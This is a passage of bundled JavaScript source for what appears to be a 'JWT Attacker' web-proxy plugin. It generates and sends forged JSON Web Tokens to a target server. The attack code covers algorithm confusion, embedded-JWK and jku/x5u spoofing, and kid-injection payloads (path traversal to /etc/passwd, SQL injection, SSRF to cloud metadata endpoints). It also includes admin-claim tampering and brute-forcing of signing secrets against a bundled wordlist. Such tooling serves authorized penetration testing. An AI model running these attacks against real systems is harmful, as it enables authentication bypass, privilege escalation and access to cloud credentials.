    // Some servers strip / lack the trailing newline.
    { secret: Buffer.from(pemNoTrailingLF, "utf8"), label: "PEM (no trailing LF)" },
    // Literal base64(PEM) — for tools/servers that use the `k` value undecoded.
    { secret: Buffer.from(pemBase64, "utf8"), label: "base64(PEM)" },
    // Raw DER bytes — the previous behavior, kept only as a last-resort fallback.
    {
      secret: originalAlg.startsWith("ES") ? ecPublicKeyPemToRawBytes(pem) : publicKeyPemToRawBytes(pem),
      label: "DER"
    }
  ];
  return variants;
}
function makeAttack(parsed, hmacAlg, secret, sourceDesc, variantLabel) {
  const header = { ...parsed.header, alg: hmacAlg };
  const headerB64 = b64urlEncode(JSON.stringify(header));
  const signingInput = `${headerB64}.${parsed.payloadB64}`;
  const jwt = signHMACRaw(signingInput, secret, hmacAlg);
  return {
    id: nanoid(),
    technique: "algConfusion",
    techniqueName: `Algorithm Confusion (${parsed.header.alg} \u2192 ${hmacAlg}, ${variantLabel})`,
    description: `CVE-2016-5431: Re-signs the token as ${hmacAlg} using the server's public key (${sourceDesc}) as the HMAC secret, encoded as ${variantLabel}. Vulnerable servers that use the same key material for both RS/ES and HS verification will accept this token.`,
    modifiedJWT: jwt,
    timestamp: Date.now()
  };
}
function attacksForKey(parsed, hmacAlg, originalAlg, keyPem, sourceDesc, seen) {
  const out = [];
  for (const v of secretVariants(keyPem, originalAlg)) {
    try {
      const attack = makeAttack(parsed, hmacAlg, v.secret, sourceDesc, v.label);
      if (seen.has(attack.modifiedJWT)) continue;
      seen.add(attack.modifiedJWT);
      attack.keyPem = keyPem;
      attack.secretEncoding = v.label;
      attack.originalJWT = `${parsed.headerB64}.${parsed.payloadB64}.${parsed.signatureB64}`;
      out.push(attack);
    } catch {
    }
  }
  return out;
}
function buildAlgConfusionForKeys(parsed, keyPems, sourceDesc) {
  const originalAlg = parsed.header.alg;
  if (!isAsymmetricAlg(originalAlg)) return [];
  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const seen = /* @__PURE__ */ new Set();
  const out = [];
  for (const pem of keyPems) {
    out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
  }
  return out;
}
var MAX_DISCOVERY_CONTENT = 16384;
async function buildAlgConfusionAttacks(parsed, requestHost, requestPort, requestTls, config, recoveredKeys = [], onDiscovery, fetcher) {
  const originalAlg = parsed.header.alg;
  if (!isAsymmetricAlg(originalAlg)) return [];
  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
  const results = [];
  const seen = /* @__PURE__ */ new Set();
  const addKey = (pem, source) => {
    results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
  };
  if (config.customPublicKeyPem) {
    addKey(config.customPublicKeyPem, "configured public key");
  }
  if (config.customCertPem) {
    try {
      const pem = x509CertToPublicKeyPem(config.customCertPem);
      addKey(pem, "configured certificate");
    } catch {
    }
  }
  if (requestTls || requestPort === 443) {
    try {
      const certPem = await fetchTLSCertPem(requestHost, requestPort);
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "TLS certificate");
    } catch {
    }
  }
  if (parsed.header.jku && fetcher) {
    try {
      const jwks = await fetchJWKS(fetcher, parsed.header.jku);
      if (jwks) {
        for (const pem of jwksToPublicKeys(jwks)) {
          addKey(pem, `jku (${parsed.header.jku})`);
        }
      }
    } catch {
    }
  }
  if (parsed.header.x5c && Array.isArray(parsed.header.x5c) && parsed.header.x5c.length > 0) {
    try {
      const certDer = Buffer.from(parsed.header.x5c[0], "base64");
      const certPem = `-----BEGIN CERTIFICATE-----
${certDer.toString("base64").match(/.{1,64}/g).join("\n")}
-----END CERTIFICATE-----
`;
      const pubKeyPem = x509CertToPublicKeyPem(certPem);
      addKey(pubKeyPem, "embedded x5c cert");
    } catch {
    }
  }
  const proto = requestTls ? "https" : "http";
  const port = requestTls && requestPort === 443 || !requestTls && requestPort === 80 ? "" : `:${requestPort}`;
  const baseUrl = `${proto}://${requestHost}${port}`;
  if (fetcher) {
    try {
      const discovered = await discoverJWKS(fetcher, baseUrl, config.extraJwksPaths);
      for (const result of discovered) {
        const pems = jwksToPublicKeys({ keys: result.keys });
        for (const pem of pems) {
          addKey(pem, `JWKS (${result.url})`);
        }
        onDiscovery?.({
          url: result.url,
          source: "JWKS endpoint",
          keyCount: pems.length,
          content: result.content.slice(0, MAX_DISCOVERY_CONTENT),
          pems
        });
      }
    } catch {
    }
    try {
      const keys = await discoverPublicKeys(fetcher, baseUrl);
      for (const k of keys) {
        addKey(k.publicKeyPem, `${k.kind} at ${k.url}`);
        onDiscovery?.({
          url: k.url,
          source: k.kind,
          keyCount: 1,
          content: k.content.slice(0, MAX_DISCOVERY_CONTENT),
          pems: [k.publicKeyPem]
        });
      }
    } catch {
    }
  }
  for (const pem of recoveredKeys) {
    addKey(pem, "recovered from HTTP history");
  }
  return results;
}

// packages/backend/src/attacks/embeddedJwk.ts
function buildEmbeddedJWKAttacks(parsed, rsaKeyPair) {
  const results = [];
  const kp = rsaKeyPair ?? generateRSAKeyPair(2048);
  const header = {
    ...parsed.header,
    alg: "RS256",
    jwk: { ...kp.publicJwk, kid: "jwt-attacker-jwk" },
    kid: "jwt-attacker-jwk",
    // Remove fields that could conflict with the embedded jwk
    jku: void 0,
    x5u: void 0,
    x5c: void 0
  };
  const jwt = signRSA(
    header,
    parsed.payload,
    kp.privateKeyPem,
    "RS256"
  );
  results.push({
    id: nanoid(),
    technique: "embeddedJwk",
    techniqueName: "Embedded JWK (RS256)",
    description: 'CVE-2018-0114: Generates a fresh RSA key pair and embeds the public key in the JWT header as a "jwk" parameter, then re-signs with the corresponding private key. Vulnerable servers that use the embedded jwk field for verification will accept this.',
    modifiedJWT: jwt,
    timestamp: Date.now()
  });
  return results;
}

// packages/backend/src/attacks/jkuSpoof.ts
function buildJKUSpoofAttacks(parsed, config, rsaKeyPair) {
  const results = [];
  if (!config.jwksUrl) {
    return { attacks: [], jwksContent: null, jwksKey: null };
  }
  const kid = "jwt-attacker-spoof-key";
  let privateKeyPem;
  let publicJwk;
  if (config.customPrivateKeyPem && config.customPublicKeyPem) {
    privateKeyPem = config.customPrivateKeyPem;
    publicJwk = publicKey2jwk(config.customPublicKeyPem);
  } else {
    const kp = rsaKeyPair ?? generateRSAKeyPair(2048);
    privateKeyPem = kp.privateKeyPem;
    publicJwk = kp.publicJwk;
  }
  const jwks = buildJWKSDocument({ ...publicJwk, kid }, kid);
  const jwksContent = JSON.stringify(jwks, null, 2);
  const jwksKey = privateKeyPem;
  const sign = (extraHeader) => {
    const header = {
      ...parsed.header,
      alg: "RS256",
      kid,
      jwk: void 0,
      jku: void 0,
      x5u: void 0,
      x5c: void 0,
      ...extraHeader
    };
    return signRSA(header, parsed.payload, privateKeyPem, "RS256");
  };
  try {
    results.push({
      id: nanoid(),
      technique: "jkuSpoof",
      techniqueName: "JKU Spoofing (RS256)",
      description: `Sets the jku header to ${config.jwksUrl} and signs with the generated private key. The server must be able to reach your JWKS endpoint. Host the generated JWKS JSON at that URL before sending this request.`,
      modifiedJWT: sign({ jku: config.jwksUrl }),
      timestamp: Date.now()
    });
  } catch {
  }
  try {
    results.push({
      id: nanoid(),
      technique: "x5uSpoof",
      techniqueName: "X5U Spoofing (RS256)",
      description: `Sets the x5u header to ${config.jwksUrl} and signs with the generated private key. Host the generated certificate / key at that URL.`,
      modifiedJWT: sign({ x5u: config.jwksUrl }),
      timestamp: Date.now()
    });
  } catch {
  }
  return { attacks: results, jwksContent, jwksKey };
}

// packages/backend/src/attacks/kidInject.ts
var PATH_TRAVERSAL_KIDS = [
  {
    kid: "../../../../dev/null",
    secret: Buffer.from(""),
    description: "Path traversal to /dev/null (empty secret)"
  },
  {
    kid: "../../../../../../dev/null",
    secret: Buffer.from(""),
    description: "Deeper path traversal to /dev/null (empty secret)"
  },
  {
    kid: "/dev/null",
    secret: Buffer.from(""),
    description: "Absolute path /dev/null (empty secret)"
  },
  {
    kid: "../../../../proc/sys/kernel/randomize_va_space",
    secret: Buffer.from("2"),
    description: "Path traversal to Linux kernel file (typical content: '2')"
  },
  {
    kid: "../../../../etc/passwd",
    secret: Buffer.from(""),
    description: "Path traversal to /etc/passwd"
  },
  {
    kid: "../../../../windows/win.ini",
    secret: Buffer.from(""),
    description: "Path traversal to Windows win.ini"
  }
];
var SQL_INJECTION_KIDS = [
  {
    kid: "' UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection returning 'secret' as the key"
  },
  {
    kid: "' UNION SELECT 'a'-- -",
    secret: Buffer.from("a"),
    description: "SQL UNION injection returning 'a' as the key"
  },
  {
    kid: "' OR '1'='1",
    secret: Buffer.from(""),
    description: "SQL OR injection (tautology)"
  },
  {
    kid: "1 OR 1=1",
    secret: Buffer.from(""),
    description: "SQL numeric OR injection"
  },
  {
    kid: `" UNION SELECT 'secret'-- -`,
    secret: Buffer.from("secret"),
    description: "SQL UNION injection (double-quote variant)"
  }
];
var SSRF_KIDS = [
  {
    kid: "http://169.254.169.254/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to AWS IMDSv1 metadata endpoint"
  },
  {
    kid: "http://metadata.google.internal/computeMetadata/v1/",
    secret: Buffer.from(""),
    description: "SSRF to GCP metadata endpoint"
  },
  {
    kid: "http://localhost/",
    secret: Buffer.from(""),
    description: "SSRF to localhost"
  }
];
var WEAK_KIDS = [
  {
    kid: "0",
    secret: Buffer.from("secret"),
    description: "Kid=0 with secret='secret'"
  },
  {
    kid: "1",
    secret: Buffer.from("secret"),
    description: "Kid=1 with secret='secret'"
  },
  {
    kid: "",
    secret: Buffer.from(""),
    description: "Empty kid with empty secret"
  }
];
function buildHSAttack(parsed, payload, category) {
  const alg = parsed.header.alg.startsWith("HS") ? parsed.header.alg : "HS256";
  const header = { ...parsed.header, alg, kid: payload.kid };
  const jwt = signHMAC(header, parsed.payload, payload.secret, alg);
  return {
    id: nanoid(),
    technique: "kidInject",
    techniqueName: `KID Injection \u2014 ${category}`,
    description: `Injects kid="${payload.kid}" \u2014 ${payload.description}`,
    modifiedJWT: jwt,
    timestamp: Date.now()
  };
}
function buildKIDInjectionAttacks(parsed) {
  const results = [];
  for (const payload of PATH_TRAVERSAL_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Path Traversal"));
  }
  for (const payload of SQL_INJECTION_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SQL Injection"));
  }
  for (const payload of SSRF_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SSRF"));
  }
  for (const payload of WEAK_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Weak KID"));
  }
  return results;
}

// packages/backend/src/attacks/claimTamper.ts
var ADMIN_FIELDS = {
  role: "admin",
  admin: true,
  is_admin: true,
  isAdmin: true,
  superuser: true,
  scope: "admin read write",
  permissions: ["admin", "read", "write"],
  group: "admin",
  groups: ["admin"],
  authorities: ["ROLE_ADMIN"]
};
var PRIVILEGE_ESCALATION_PAYLOADS = [
  { label: "Role=Admin", changes: { role: "admin" } },
  { label: "Admin=True", changes: { admin: true, is_admin: true } },
  { label: "Superuser+All Scope", changes: { superuser: true, scope: "openid profile email admin read write" } },
  { label: "Sub='admin'", changes: { sub: "admin" } },
  { label: "Sub='root'", changes: { sub: "root" } },
  { label: "Sub='administrator'", changes: { sub: "administrator" } },
  { label: "Full Admin Blast", changes: { ...ADMIN_FIELDS } }
];
var EXPIRY_MANIPULATIONS = [
  {
    label: "Expiry +10 years",
    mutate: (p) => {
      const now = Math.floor(Date.now() / 1e3);
      return {
        ...p,
        exp: now + 60 * 60 * 24 * 365 * 10,
        nbf: now - 60,
        iat: now
      };
    }
  },
  {
    label: "Remove expiry",
    mutate: (p) => {
      const out = { ...p };
      delete out.exp;
      return out;
    }
  }
];
function buildClaimTamperAttacks(parsed) {
  const results = [];
  for (const { label, changes } of PRIVILEGE_ESCALATION_PAYLOADS) {
    const payload = { ...parsed.payload, ...changes };
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper \u2014 ${label}`,
      description: `Modifies payload claims (${label}) while preserving the original algorithm. The signature is invalid \u2014 surfaces servers that skip verification.`,
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now()
    });
  }
  for (const { label, mutate } of EXPIRY_MANIPULATIONS) {
    const payload = mutate(parsed.payload);
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper \u2014 ${label}`,
      description: `${label}: modifies temporal claims while preserving original algorithm and signature. Surfaces servers that do not validate expiry, or where expiry is checked separately from signature.`,
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now()
    });
  }
  const stripped = { ...parsed.payload };
  for (const k of ["exp", "nbf", "iat", "jti", "iss", "aud"]) delete stripped[k];
  results.push({
    id: nanoid(),
    technique: "claimTamper",
    techniqueName: "Claim Tamper \u2014 Strip Security Claims",
    description: "Removes exp, nbf, iat, jti, iss, and aud claims with original signature. Tests whether the server enforces these validation steps independently.",
    modifiedJWT: buildJWT(parsed.header, stripped, parsed.signatureB64),
    timestamp: Date.now()
  });
  return results;
}

// packages/backend/src/wordlist.ts
var WEAK_JWT_SECRETS = [
  // Empty / trivial
  "",
  "secret",
  "Secret",
  "SECRET",
  // Common passwords
  "password",
  "Password",
  "PASSWORD",
  "password1",
  "Password1",
  "123456",
  "1234567890",
  "12345678",
  "123456789",
  "0123456789",
  "111111",
  "222222",
  "333333",
  "555555",
  "666666",
  "777777",
  "888888",
  "999999",
  "qwerty",
  "qwerty123",
  "abc123",
  "letmein",
  "letmein1",
  "monkey",
  "dragon",
  "master",
  "sunshine",
  "princess",
  "football",
  "baseball",
  "iloveyou",
  "trustno1",
  "abcdef",
  "abcdefghij",
  "1234abcd",
  "welcome",
  "Welcome1",
  "swordfish",
  "hello",
  "world",
  // JWT-specific
  "jwt-secret",
  "jwt_secret",
  "jwtSecret",
  "jwtSecret123",
  "jwt-key",
  "jwt_key",
  "jwtKey",
  "jwt-token",
  "auth-token",
  "authtoken",
  "your-secret-key",
  "your-256-bit-secret",
  "your-384-bit-secret",
  "your-512-bit-secret",
  "your-secret",
  "your_secret",
  "mysecret",
  "my_secret",
  "my-secret",
  "secretkey",
  "secret_key",
  "secret-key",
  "secretkey123",
  "supersecret",
  "super_secret",
  "super-secret",
  "shared-secret",
  "shared_secret",
  // Placeholder strings
  "change-this-to-a-secret",
  "please-change-me",
  "THIS_IS_NOT_SECURE",
  "NOT_SECURE",
  "CHANGEME",
  "CHANGE_ME",
  "changeme",
  "changeme!",
  "TODO_CHANGE_ME",
  "TODO",
  // Application/framework defaults
  "flask_secret",
  "django_secret",
  "rails_secret",
  "express_secret",
  "node_env_secret",
  "laravel_secret",
  "rails_secret_key_base",
  "SECRET_KEY",
  "AUTH_SECRET",
  "JWT_SECRET",
  "APP_SECRET",
  "ACCESS_TOKEN_SECRET",
  "REFRESH_TOKEN_SECRET",
  // Environment variable names (developers sometimes use these as values)
  "JWT_SECRET",
  "jwt_secret",
  "NODE_ENV",
  // Dev/test
  "test",
  "test123",
  "testing",
  "testing123",
  "test_secret",
  "dev",
  "development",
  "staging",
  "production",
  "prod",
  "local",
  "localhost",
  "debug",
  "DEBUG",
  // Common short words
  "default",
  "admin",
  "administrator",
  "root",
  "user",
  "demo",
  "sample",
  "example",
  "temp",
  "tmp",
  "key",
  "token",
  "session",
  "cookie",
  "login",
  "pepper",
  "salt",
  "hash",
  "app",
  "application",
  "service",
  "api",
  "backend",
  "null",
  "undefined",
  "none",
  "nil",
  "empty",
  // Keyboard walks
  "qazwsx",
  "zxcvbnm",
  "asdfghjkl",
  // Numeric
  "000000",
  "11111111",
  "00000000",
  // Mixed case variants
  "Admin",
  "ROOT",
  "User",
  "Demo",
  "Changeme",
  "Secret1",
  "P@ssw0rd",
  "P@ssword",
  "s3cr3t",
  "S3cr3t",
  "p4ssw0rd",
  "secr3t",
  // Potential env file leaks
  "super_secret_jwt_key",
  "your_jwt_secret_here",
  // Year-based
  "2020",
  "2021",
  "2022",
  "2023",
  "2024",
  "2025",
  "secret2023",
  "secret2024",
  "jwt2024",
  // UUID-looking but common
  "00000000-0000-0000-0000-000000000000",
  // International common passwords
  "wachtwoord",
  "motdepasse",
  "kennwort",
  // Security research community
  "kali",
  "pentest",
  "hacker",
  "hack",
  "exploit",
  "pwned"
];

// packages/backend/src/attacks/weakSecret.ts
async function buildWeakSecretAttacks(parsed, config, originalToken) {
  const alg = parsed.header.alg;
  if (!alg.startsWith("HS")) return [];
  const hmacAlg = alg;
  const wordlist = [...WEAK_JWT_SECRETS, ...config.customWordlist];
  const results = [];
  for (const word of wordlist) {
    const secret = Buffer.from(word, "utf8");
    if (!verifyHMAC(originalToken, secret, hmacAlg)) continue;
    const adminPayload = {
      ...parsed.payload,
      role: "admin",
      admin: true,
      is_admin: true,
      exp: Math.floor(Date.now() / 1e3) + 60 * 60 * 24 * 365
    };
    const adminJwt = signHMAC(parsed.header, adminPayload, secret, hmacAlg);
    const resignedJwt = signHMAC(parsed.header, parsed.payload, secret, hmacAlg);
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Found: "${word}"`,
      description: `Cracked the ${hmacAlg} signing secret: "${word}". Provides re-signed token with elevated claims (admin=true, role=admin, +1yr exp).`,
      modifiedJWT: adminJwt,
      timestamp: Date.now()
    });
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Re-sign (original claims): "${word}"`,
      description: `Re-signs the original token with secret "${word}" \u2014 no claim changes. Useful to verify the server accepts the cracked secret.`,
      modifiedJWT: resignedJwt,
      timestamp: Date.now()
    });
  }
  return results;
}

// packages/backend/src/index.ts
async function attackJwt(sdk, requestId, config) {
  const sessionId = Math.random().toString(36).slice(2);
  const errors = [];
  sdk.console.log(`[JWT Attacker] attackJwt called: requestId=${requestId}`);
  (async () => {
    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: 0 });
    const reqResp = await sdk.requests.get(requestId);
    if (!reqResp) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["Request not found"] });
      return;
    }
    const { request } = reqResp;
    const spec = request.toSpec();
    const locations = findJWTsInSpec(spec);
    if (locations.length === 0) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request (checked Authorization header, cookies, and JSON body)"] });
      return;
    }
    const loc = locations[0];
    const originalJWT = loc.jwt;
    let parsed;
    try {
      parsed = parseJWT(originalJWT);
    } catch (e) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: [`JWT parse failed: ${e.message}`] });
      return;
    }
    const cfg = normalizeConfig(config);
    sdk.console.log(
      `[JWT Attacker] enabled attacks: ${Object.entries(cfg.enabledAttacks).filter(([, v]) => v).map(([k]) => k).join(", ") || "(none)"}`
    );
    let rsaKeyPair;
    const haveConfiguredKeyPair = !!(cfg.customPrivateKeyPem && cfg.customPublicKeyPem);
    const needsKeyPair = cfg.enabledAttacks.embeddedJwk || !!cfg.jwksUrl && (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) && !haveConfiguredKeyPair;
    if (needsKeyPair) {
      try {
        sdk.api.send("jwt-key-recovery-progress", {
          sessionId,
          message: "Generating RSA key pair for JWK-injection attacks\u2026"
        });
        rsaKeyPair = generateRSAKeyPair(2048);
      } catch (e) {
        errors.push(`[keygen] ${e.message}`);
        sdk.console.log(`[JWT Attacker] RSA keygen failed: ${e.message}`);
      }
    }
    const attacks = [];
    const merge = (arr) => attacks.push(...arr);
    const tryMerge = async (name, fn) => {
      try {
        merge(await fn());
      } catch (e) {
        errors.push(`[${name}] ${e.message}`);
        sdk.console.log(`[JWT Attacker] ${name} builder failed: ${e.message}`);
      }
    };
    if (cfg.enabledAttacks.none) await tryMerge("none", () => buildNoneAttacks(parsed));
    if (cfg.enabledAttacks.nullSig) await tryMerge("nullSig", () => buildNullSigAttacks(parsed));
    if (cfg.enabledAttacks.embeddedJwk) await tryMerge("embeddedJwk", () => buildEmbeddedJWKAttacks(parsed, rsaKeyPair));
    if (cfg.enabledAttacks.kidInject) await tryMerge("kidInject", () => buildKIDInjectionAttacks(parsed));
    if (cfg.enabledAttacks.claimTamper) await tryMerge("claimTamper", () => buildClaimTamperAttacks(parsed));
    if (cfg.enabledAttacks.weakSecret) {
      await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
    }
    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
      try {
        const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, cfg, rsaKeyPair);
        merge(spoofAttacks);
        if (jwksContent && jwksKey) {
          sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
        }
      } catch (e) {
        errors.push(`[jkuSpoof] ${e.message}`);
      }
    }
    const httpGet = async (url) => {
      const getSpec = new RequestSpec(url);
      const sent = await sdk.requests.send(getSpec);
      const code = sent.response?.getCode();
      if (!sent.response || code === void 0 || code < 200 || code >= 300) {
        throw new Error(`HTTP ${code ?? "no response"}`);
      }
      const body = sent.response.getBody();
      return body ? bodyToText(body) : "";
    };
    if (cfg.enabledAttacks.algConfusion) {
      await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
        parsed,
        request.getHost(),
        request.getPort(),
        request.getTls(),
        cfg,
        [],
        // first wave: no recovered keys yet — recovery runs as a second wave below
        // Surface every discovered key source so the analyst doesn't miss it.
        (found) => sdk.api.send("jwks-found", { sessionId, ...found }),
        httpGet
      ));
    }
    sdk.console.log(`[JWT Attacker] built ${attacks.length} attack variant(s)`);
    const baseline = {
      id: nanoid(),
      technique: "baseline",
      techniqueName: "Original request (baseline)",
      description: "The unmodified original request, sent first to establish a baseline response for comparison.",
      modifiedJWT: originalJWT,
      timestamp: Date.now()
    };
    const sendAttacks = async (list) => {
      for (const attack of list) {
        try {
          const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
          const start = Date.now();
          const sent = await sdk.requests.send(attackSpec);
          attack.durationMs = Date.now() - start;
          attack.requestId = sent.request?.getId();
          if (sent.response) {
            attack.responseStatus = sent.response.getCode();
            const body = sent.response.getBody();
            const bodyText = body ? await bodyToText(body) : "";
            attack.responseLength = bodyText.length;
            attack.responseBody = bodyText.slice(0, 4096);
            attack.responseHeaders = flattenHeaders(sent.response.getHeaders());
          }
        } catch (e) {
          attack.error = e.message;
          errors.push(`[${attack.techniqueName}] ${attack.error}`);
        }
        sdk.api.send("jwt-attack-result", { sessionId, result: attack });
      }
    };
    const firstWave = [baseline, ...attacks];
    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: firstWave.length });
    await sendAttacks(firstWave);
    if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
      try {
        const host = request.getHost();
        const historyJWTs = await collectHistoryJWTs(sdk, host, 25);
        if (historyJWTs.length >= 2) {
          sdk.api.send("jwt-key-recovery-progress", {
            sessionId,
            message: `Found ${historyJWTs.length} distinct RSA JWT(s) from ${host} \u2014 attempting public-key recovery (this can take a while)\u2026`
          });
          const keyResults = await recoverPublicKeyFromJWTs(
            historyJWTs,
            (msg) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: msg })
          );
          const recoveredKeys = keyResults.map((r) => r.publicKeyPem);
          if (recoveredKeys.length) {
            sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: recoveredKeys });
            const extra = buildAlgConfusionForKeys(parsed, recoveredKeys, "recovered from HTTP history");
            if (extra.length) {
              attacks.push(...extra);
              sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length + 1 });
              await sendAttacks(extra);
            }
          }
        }
      } catch (e) {
        errors.push(`[keyRecovery] ${e.message}`);
        sdk.console.log(`[JWT Attacker] key recovery failed: ${e.message}`);
      }
    }
    if (attacks.length === 0) {
      errors.push("No attack variants were generated \u2014 check that at least one attack is enabled in Configuration.");
    }
    sdk.api.send("jwt-attack-complete", { sessionId, errors });
  })().catch((e) => {
    sdk.api.send("jwt-attack-complete", { sessionId, errors: [e.message] });
  });
  return { sessionId };
}
async function getJWTsInRequest(sdk, requestId) {
  const reqResp = await sdk.requests.get(requestId);
  if (!reqResp) return [];
  return findJWTsInSpec(reqResp.request.toSpec());
}
var ALL_ATTACKS = [
  "none",
  "nullSig",
  "algConfusion",
  "embeddedJwk",
  "jkuSpoof",
  "x5uSpoof",
  "kidInject",
  "claimTamper",
  "weakSecret"
];
function normalizeConfig(raw) {
  const c = raw && typeof raw === "object" ? raw : {};
  const rawEnabled = c.enabledAttacks && typeof c.enabledAttacks === "object" ? c.enabledAttacks : {};
  const hasAnyFlag = ALL_ATTACKS.some((k) => typeof rawEnabled[k] === "boolean");
  const enabledAttacks = {};
  for (const k of ALL_ATTACKS) {
    enabledAttacks[k] = hasAnyFlag ? rawEnabled[k] === true : true;
  }
  return {
    jwksUrl: typeof c.jwksUrl === "string" ? c.jwksUrl : "",
    customPublicKeyPem: typeof c.customPublicKeyPem === "string" ? c.customPublicKeyPem : "",
    customPrivateKeyPem: typeof c.customPrivateKeyPem === "string" ? c.customPrivateKeyPem : "",
    customCertPem: typeof c.customCertPem === "string" ? c.customCertPem : "",
    extraJwksPaths: Array.isArray(c.extraJwksPaths) ? c.extraJwksPaths : [],
    customWordlist: Array.isArray(c.customWordlist) ? c.customWordlist : [],
    enableKeyRecovery: c.enableKeyRecovery === true,
    enabledAttacks
  };
}
function findJWTsInSpec(spec) {
  const locations = [];
  const headers = spec.getHeaders();
  const authVals = headers["authorization"] ?? headers["Authorization"] ?? [];
  for (const val of authVals) {
    const match = val.match(/^(Bearer\s+)(.+)$/i);
    if (match && looksLikeJWT(match[2])) {
      locations.push({ type: "header", headerName: "Authorization", prefix: match[1], jwt: match[2] });
    } else if (looksLikeJWT(val)) {
      locations.push({ type: "header", headerName: "Authorization", prefix: "", jwt: val });
    }
  }
  const cookieVals = headers["cookie"] ?? headers["Cookie"] ?? [];
  for (const cookieStr of cookieVals) {
    const cookies = parseCookies(cookieStr);
    for (const [name, value] of Object.entries(cookies)) {
      if (looksLikeJWT(value)) {
        locations.push({ type: "cookie", cookieName: name, jwt: value });
      }
    }
  }
  for (const name of ["X-Auth-Token", "X-Access-Token", "X-JWT-Token", "Token"]) {
    const vals = headers[name.toLowerCase()] ?? headers[name] ?? [];
    for (const val of vals) {
      if (looksLikeJWT(val)) {
        locations.push({ type: "header", headerName: name, prefix: "", jwt: val });
      }
    }
  }
  const body = spec.getBody?.();
  if (body) {
    try {
      const text = typeof body.toText === "function" ? body.toText() : body.toString();
      const json = JSON.parse(text);
      for (const key of ["token", "access_token", "id_token", "jwt", "auth_token", "refresh_token"]) {
        if (typeof json[key] === "string" && looksLikeJWT(json[key])) {
          locations.push({ type: "body-json", jsonKey: key, jwt: json[key] });
        }
      }
    } catch {
    }
  }
  return locations;
}
function cloneSpecWithJWT(original, loc, newJWT) {
  const clone = RequestSpec.parse(original.getRaw());
  if (loc.type === "header" && loc.headerName) {
    clone.setHeader(loc.headerName, `${loc.prefix ?? ""}${newJWT}`);
  } else if (loc.type === "cookie" && loc.cookieName) {
    const headers = clone.getHeaders();
    const cookieVals = headers["cookie"] ?? headers["Cookie"] ?? [];
    const cookieStr = cookieVals[0] ?? "";
    const cookies = parseCookies(cookieStr);
    cookies[loc.cookieName] = newJWT;
    const newCookie = Object.entries(cookies).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("; ");
    clone.setHeader("Cookie", newCookie);
  } else if (loc.type === "body-json" && loc.jsonKey) {
    const body = clone.getBody?.();
    if (body) {
      try {
        const text = typeof body.toText === "function" ? body.toText() : body.toString();
        const json = JSON.parse(text);
        json[loc.jsonKey] = newJWT;
        clone.setBody(JSON.stringify(json));
      } catch {
      }
    }
  }
  return clone;
}
async function bodyToText(body) {
  if (typeof body === "string") return body;
  if (body && typeof body.toText === "function") {
    return body.toText();
  }
  if (body && typeof body.toRaw === "function") {
    return Buffer.from(body.toRaw()).toString("utf8");
  }
  return "";
}
function flattenHeaders(headers) {
  const out = {};
  for (const [k, vs] of Object.entries(headers)) {
    out[k] = vs.join(", ");
  }
  return out;
}
async function collectHistoryJWTs(sdk, host, limit) {
  const results = [];
  const seen = /* @__PURE__ */ new Set();
  try {
    const page = await sdk.requests.query().filter(`req.host.eq:"${host}"`).descending("req", "id").first(limit).execute();
    const conn = page;
    for (const item of conn.items ?? []) {
      if (!item.request) continue;
      const spec = item.request.toSpec();
      const locs = findJWTsInSpec(spec);
      for (const loc of locs) {
        if (seen.has(loc.jwt)) continue;
        seen.add(loc.jwt);
        try {
          const parsed = parseJWT(loc.jwt);
          const fam = getAlgorithmFamily(parsed.header.alg);
          if ((fam === "RS" || fam === "PS") && parsed.signatureB64) {
            results.push(parsed);
            if (results.length >= 10) return results;
          }
        } catch {
        }
      }
    }
  } catch {
  }
  return results;
}
function init(sdk) {
  sdk.console.log("[JWT Attacker] backend init() called");
  sdk.api.register("attackJwt", attackJwt);
  sdk.api.register("getJWTsInRequest", getJWTsInRequest);
  sdk.console.log("[JWT Attacker] backend init() complete");
}
export {
  init
};
